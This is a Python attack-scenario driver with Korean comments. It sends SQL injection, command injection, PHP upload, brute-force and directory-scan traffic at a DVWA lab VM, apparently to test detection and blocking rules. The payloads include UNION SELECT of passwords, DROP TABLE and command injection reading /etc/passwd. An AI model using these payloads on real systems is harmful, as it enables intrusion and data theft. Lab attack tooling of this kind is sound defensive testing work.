"""
A(공격·타겟) — DVWA 대상 공격 시나리오 드라이버.

규약1의 공격유형 코드 5종을 각각 재현한다:
  sqli | command_injection | webshell_upload | brute_force | dir_scan

kali에서 실행한다. 외부 진입점은 web VM(192.168.10.10)의 80이다.

사용법:
  python3 attacks.py sqli
  python3 attacks.py brute_force --count 30
  python3 attacks.py all                       # 5종 순차 실행
  python3 attacks.py probe --measure           # 차단이 걸리는 순간을 외부에서 측정

  # 공용 옵션
  --target http://192.168.10.10   (기본값은 환경변수 DVWA_URL)
  --count N                        (반복 횟수/강도)
  --log attacks.jsonl              (공격 기록 JSONL 경로)

설계 메모:
  - 모든 공격은 시작 시각을 JSONL로 남긴다. 이 시각은 "센서 탐지(detected_at)"가 아니라
    "공격 발생" 시각이다. TTB의 진짜 기산점은 센서가 잡은 @timestamp(B 담당)이다.
  - probe --measure 는 공격자 관점에서 "언제 잘렸는지"를 잰다. DROP이 걸리면 응답이
    끊기고 타임아웃이 나므로, 그 전환 시점이 곧 차단이 실제 발효된 시각이다.
    이건 D의 서버측 TTB(ttb_ms)와 독립적인 외부 검증값이다 (검증항목 1·2를 한 번에).

주의: DVWA는 취약한 채로 둔다. 이 스크립트는 취약점을 "고치지" 않고 "발생"시킨다.
"""

import argparse
import os
import random
import re
import sys
import time
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    sys.exit("requests가 필요합니다:  pip3 install requests")


DEFAULT_TARGET = os.environ.get("DVWA_URL", "http://192.168.10.10")
DVWA_USER = os.environ.get("DVWA_USER", "admin")
DVWA_PASS = os.environ.get("DVWA_PASS", "password")

TOKEN_RE = re.compile(r"user_token'\s*value='([0-9a-f]+)'")


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def log_event(path: str, rec: dict) -> None:
    import json
    rec = {"logged_at": now_iso(), **rec}
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print(f"  . {rec.get('attack_type','?'):18} {rec.get('note','')}")


def record(log_path: str, attack_type: str, note: str, target_url: str) -> None:
    log_event(log_path, {"attack_type": attack_type, "note": note, "target_url": target_url})


def get_token(sess, url: str) -> str:
    html = sess.get(url, timeout=10).text
    m = TOKEN_RE.search(html)
    return m.group(1) if m else ""


def login(target: str):
    """DVWA 로그인 후 보안 레벨을 low로 맞춘 세션을 돌려준다. low여야 공격이 통한다."""
    sess = requests.Session()
    token = get_token(sess, f"{target}/login.php")
    r = sess.post(f"{target}/login.php", data={
        "username": DVWA_USER, "password": DVWA_PASS,
        "Login": "Login", "user_token": token,
    }, timeout=10, allow_redirects=True)
    if "login.php" in r.url:
        sys.exit("로그인 실패 — 계정/비밀번호 또는 /setup.php DB 초기화를 확인하세요.")

    sec_token = get_token(sess, f"{target}/security.php")
    sess.post(f"{target}/security.php", data={
        "security": "low", "seclev_submit": "Submit", "user_token": sec_token,
    }, timeout=10)
    sess.cookies.set("security", "low")
    return sess


# --------------------------- 공격 5종 ---------------------------

def attack_sqli(sess, target, count, log_path):
    """SQL 인젝션 — 반복 패턴(규약: 5분 내 5건). CRS 942xxx / Suricata SQL 룰."""
    payloads = ["1' OR '1'='1", "1' UNION SELECT user,password FROM users-- -",
                "1' AND SLEEP(2)-- -", "1'; DROP TABLE users-- -", "1' OR 1=1#"]
    for i in range(count):
        p = payloads[i % len(payloads)]
        sess.get(f"{target}/vulnerabilities/sqli/", params={"id": p, "Submit": "Submit"}, timeout=10)
        time.sleep(0.3)
    record(log_path, "sqli", f"{count}건 전송", f"{target}/vulnerabilities/sqli/")


def attack_command_injection(sess, target, count, log_path):
    """커맨드 인젝션 — 단건 즉시 차단(규약: 1건 즉시). CRS 932xxx."""
    payloads = ["127.0.0.1; id", "127.0.0.1 | whoami", "127.0.0.1 && uname -a",
                "127.0.0.1; cat /etc/passwd"]
    for i in range(count):
        sess.post(f"{target}/vulnerabilities/exec/",
                  data={"ip": payloads[i % len(payloads)], "Submit": "Submit"}, timeout=10)
        time.sleep(0.3)
    record(log_path, "command_injection", f"{count}건 전송", f"{target}/vulnerabilities/exec/")


def attack_webshell_upload(sess, target, count, log_path):
    """웹셸 업로드 — 단건 즉시 차단(규약: 1건 즉시). 무해 마커만 든 .php."""
    marker = "<?php echo 'SOAR-TEST-MARKER'; ?>"   # 무해한 마커. 실제 셸 아님.
    for i in range(count):
        files = {"uploaded": (f"probe_{i}.php", marker, "application/x-php")}
        sess.post(f"{target}/vulnerabilities/upload/",
                  files=files, data={"MAX_FILE_SIZE": "100000", "Upload": "Upload"}, timeout=10)
        time.sleep(0.3)
    record(log_path, "webshell_upload", f"{count}건 업로드(무해 마커)", f"{target}/vulnerabilities/upload/")


def attack_brute_force(sess, target, count, log_path):
    """무차별 대입 — 로그인 실패 대량(규약: 1분 내 20건). Suricata rate 룰."""
    pwlist = ["admin", "123456", "password1", "letmein", "root", "qwerty",
              "dvwa", "test", "guest", "1234"]
    for i in range(count):
        pw = pwlist[i % len(pwlist)] + str(i)
        sess.get(f"{target}/vulnerabilities/brute/",
                 params={"username": "admin", "password": pw, "Login": "Login"}, timeout=10)
        time.sleep(0.1)
    record(log_path, "brute_force", f"로그인 실패 {count}건", f"{target}/vulnerabilities/brute/")


def attack_dir_scan(sess, target, count, log_path):
    """디렉터리 스캔 — 404 대량(규약: 5분 내 404 100건). dirb/gobuster 흉내."""
    words = ["admin", "backup", "config", "db", "old", "test", "phpmyadmin",
             "wp-admin", ".git", ".env", "shell", "cmd", "uploads", "secret"]
    hits = 0
    for i in range(count):
        path = random.choice(words) + str(random.randint(1, 9999))
        r = sess.get(f"{target}/{path}", timeout=10)
        if r.status_code == 404:
            hits += 1
        time.sleep(0.05)
    record(log_path, "dir_scan", f"404 {hits}건 유발", f"{target}/")


SCENARIOS = {
    "sqli": (attack_sqli, 5),
    "command_injection": (attack_command_injection, 1),
    "webshell_upload": (attack_webshell_upload, 1),
    "brute_force": (attack_brute_force, 25),
    "dir_scan": (attack_dir_scan, 120),
}


# ----------------------- 차단 발효 시점 측정 -----------------------

def probe(target: str, measure: bool, log: str):
    """공격자 관점 측정. benign 요청을 반복하며 응답을 기록한다.
    DROP이 걸리면 타임아웃으로 전환되는데, 그 전환 시점이 차단 발효 시각이다."""
    print(f"[probe] {target} 을 반복 요청하며 차단 발효를 감시합니다 (Ctrl-C 중단)")
    start = time.monotonic()
    blocked_at = None
    consecutive_timeout = 0
    i = 0
    while True:
        i += 1
        t0 = time.monotonic()
        try:
            requests.get(target, timeout=3)
            consecutive_timeout = 0
            state = "OK"
        except (requests.ConnectTimeout, requests.ReadTimeout):
            consecutive_timeout += 1
            state = "TIMEOUT"
        except requests.ConnectionError:
            consecutive_timeout += 1
            state = "REFUSED/RESET"
        dt = (time.monotonic() - t0) * 1000
        print(f"  #{i:03d} {state:14} {dt:6.0f}ms")

        if consecutive_timeout >= 3 and blocked_at is None:
            blocked_at = time.monotonic()
            elapsed = blocked_at - start
            print(f"\n[probe] 차단 발효 감지 — 감시 시작 후 약 {elapsed:.1f}s")
            if log:
                log_event(log, {"attack_type": "probe", "note": f"blocked after {elapsed:.1f}s",
                                "attacker_side_ttb_sec": round(elapsed, 1)})
            if measure:
                return
        time.sleep(1)


# ------------------------------- main -------------------------------

def main():
    ap = argparse.ArgumentParser(description="DVWA 공격 시나리오 드라이버 (역할 A)")
    ap.add_argument("scenario", choices=list(SCENARIOS) + ["all", "probe"])
    ap.add_argument("--target", default=DEFAULT_TARGET)
    ap.add_argument("--count", type=int, default=None)
    ap.add_argument("--log", default="attacks.jsonl")
    ap.add_argument("--measure", action="store_true", help="probe: 차단 감지 시 종료")
    args = ap.parse_args()

    if args.scenario == "probe":
        probe(args.target, args.measure, args.log)
        return

    print(f"[A] 대상: {args.target}  로그인 중...")
    sess = login(args.target)
    print("[A] 로그인 성공. 공격 시작.")

    def run(name):
        fn, default_count = SCENARIOS[name]
        cnt = args.count if args.count is not None else default_count
        print(f"\n> {name} (count={cnt})")
        fn(sess, args.target, cnt, args.log)

    if args.scenario == "all":
        for name in SCENARIOS:
            run(name)
            time.sleep(1)
    else:
        run(args.scenario)

    print(f"\n[A] 완료. 기록: {args.log}")
    print("    -> C의 Kibana에서 알람이 뜨고, D의 ipset에 IP가 등록되는지 확인하세요.")


if __name__ == "__main__":
    main()
